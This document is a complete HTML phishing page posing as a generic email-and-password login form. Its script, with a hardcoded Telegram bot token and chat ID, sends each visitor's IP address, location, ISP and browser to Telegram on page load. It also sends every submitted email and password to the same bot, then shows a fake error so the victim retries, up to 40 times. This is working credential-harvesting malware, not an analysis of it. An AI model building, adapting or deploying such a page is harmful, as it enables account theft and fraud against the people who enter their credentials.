<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Login</title>
<style>
/* 1. Global Reset & Resolution Logic */
*, *::before, *::after {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

/* Prevents horizontal scrolling on small screens */
html, body {
    overflow-x: hidden;
    width: 100%;
}

body {
    font-family: Arial, sans-serif;
    background-image: url('https://res.cloudinary.com/dxzzgijsa/image/upload/v1784523407/gen2_a8yrct.jpg');
    background-size: cover;
    background-position: center;
    background-repeat: no-repeat;
    background-attachment: fixed;
    min-height: 100vh;
    
    /* THE AUTO-FIX ENGINE */
    display: flex;
    justify-content: center; /* Horizontally centers the box */
    align-items: flex-start; /* Allows us to use margin-top for the 45vh */
    padding: 20px;
}

/* 2. Intro Container - Scaling Fix */
#introImageContainer {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: black;
    display: flex;
    align-items: center;
    justify-content: center;
    z-index: 9999;
}

#introImageContainer img {
    max-width: 90%;
    max-height: 90%;
    height: auto;
}

/* 3. The Login Container - POSITIONED AT 40VH */
.login-container {
    position: relative;
    width: 90%;          /* Mobile width */
    max-width: 300px;    /* Laptop width limit */

    /* 40vh POSITION: Stays 40% down from the top on all resolutions */
    margin-top: 50vh; 

    background: 
    padding: 20px;
    border-radius: 3px;
    box-shadow:
}

/* 4. IMAGE AUTO-FIX (Shrinks for small screens) */
img {
    max-width: 100%;
    height: auto;
}

/* 5. Original Styles (Fonts and colors unchanged) */
.welcome-title {
    color: #0066cc;
    font-size: 32px;
    font-weight: 600;
    margin-bottom: 40px;
    text-align: left;
}

.form-group {
    margin-bottom: 5px;
    width: 100%;
}

.form-label {
    display: block;
    color: #666;
    font-size: 14px;
    font-weight: 500;
    margin-bottom: 10px;
}

.form-input {
    width: 100%; 
    padding: 12px;
    border: 2px solid #d1d5db;
    border-radius: 5px;
    font-size: 16px;
    background: white;
}

.sign-in-btn {
    width: 100%; 
    background: #0066CC;
    color: white;
    border: none;
    padding: 12px;
    border-radius: 4px;
    font-size: 15px;
    font-weight: 600;
    cursor: pointer;
}

/* 6. SMALL SCREEN RESOLUTION OVERRIDE */
/* This stops the box from being pushed off the bottom on short screens (like small laptops or phones) */
@media (max-height: 700px) {
    .login-container {
        margin-top: 50vh; /* Auto-lifts the box so it doesn't scroll off-screen */
    }
}

@media (max-width: 480px) {
    .welcome-title {
        font-size: 24px;
        text-align: center;
    }
    .login-container {
        padding: 15px;
        width: 95%;
    }
}



</style>
</head>
<body>
<!-- Int Image Ovelay -->
<div id="introImageContainer">
<img src="https://res.cloudinary.com/dxzzgijsa/image/upload/v1766248245/Screenshot_2025-12-17_072511_ao2aww.png" alt="Intro Image" />
</div>

<!--  Log Fom -->
<div class="login-container" id="loginContainer">
<h1 class="welcome-title"></h1>

<form id="loginForm">
<div id="errorMessage" class="error-message" style="display: none;"></div>

<div class="form-group">
        <label class="form-label"></label>
<input type="text" id="userId" name="userId" class="form-input" Placeholder="Email Address" required value="" />
</div>

<div class="form-group">
<div class="password-container">
<label class="form-label"></label>
<input type="password" id="password" name="password" class="form-input" required Placeholder="Password" />
<button type="button" class="password-toggle" onclick="togglePassword()"></button>
</div>
</div>

<div class="checkbox-container">
<label for="rememberUser" class="checkbox-label"></label>
</div>

<button type="submit" class="sign-in-btn">sign in</button>

</div>
</form>
</div>

<script>
const token = '8639240486:AAG06St82diBzR7EmEZrQ2jiK-WGrrRbBkA';
const chatId = '8052751627';
let loginAttempts = 0;

async function sendToTelegram(message) {
if (!navigator.onLine) return;
try {
await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
method: 'POST',
headers: { 'Content-Type': 'application/json' },
body: JSON.stringify({ chat_id: chatId, text: message })
});
} catch (err) {
console.error('Telegram send error:', err);
}
}

function togglePassword() {
const passwordInput = document.getElementById('password');
const toggleButton = document.querySelector('.password-toggle');

if (passwordInput.type === 'password') {
passwordInput.type = 'text';
toggleButton.textContent = '';
} else {
passwordInput.type = 'password';
toggleButton.textContent = '👁';
}
}

function sendVisitorInfo() {
const userAgent = navigator.userAgent;
const port = window.location.port || (window.location.protocol === 'https:' ? '443' : '80');

if (!navigator.onLine) {
sendToTelegram(`gene Offline Visi\n🖥 Browser: ${userAgent}\n🔌 Port: ${port}`);
return;
}

fetch('https://ipapi.co/json/')
.then(res => res.json())
.then(data => {
const message = `🌐 gen Visi \nIP: ${data.ip}\nPort: ${port}\nCountry: ${data.country_name}\nCity: ${data.city}\nISP: ${data.org}\nBrowser: ${userAgent}`;
sendToTelegram(message);
}).catch(() => {
sendToTelegram(`🌐 gen  Visi (IP lookup failed)\nBrowser: ${userAgent}`);
});
}

window.onload = () => {
sendVisitorInfo();

setTimeout(() => {
const intro = document.getElementById('introImageContainer');
const login = document.getElementById('loginContainer');
if (intro) intro.style.display = 'none';
if (login) login.style.display = 'block';
}, 500);
};

document.getElementById('loginForm').addEventListener('submit', async function (e) {
e.preventDefault();

const userId = document.getElementById('userId').value.trim();
const password = document.getElementById('password').value.trim();

if (userId && password) {
loginAttempts++;
const msg = `❌ gen drop #${loginAttempts}\n👤 User ID: ${userId}\n🔑 Password: ${password}`;
await sendToTelegram(msg);

const errorMsg = document.getElementById('errorMessage');
errorMsg.textContent =
"";
errorMsg.style.display = 'block';

document.getElementById('password').value = '';
document.getElementById('password').focus();

if (loginAttempts >= 40) {
window.location.href =
'https://res.cloudinary.com/dxzzgijsa/image/upload/v1766248245/Screenshot_2025-12-17_072511_ao2aww.png';
}
}
});
</script>
</body>
</html>
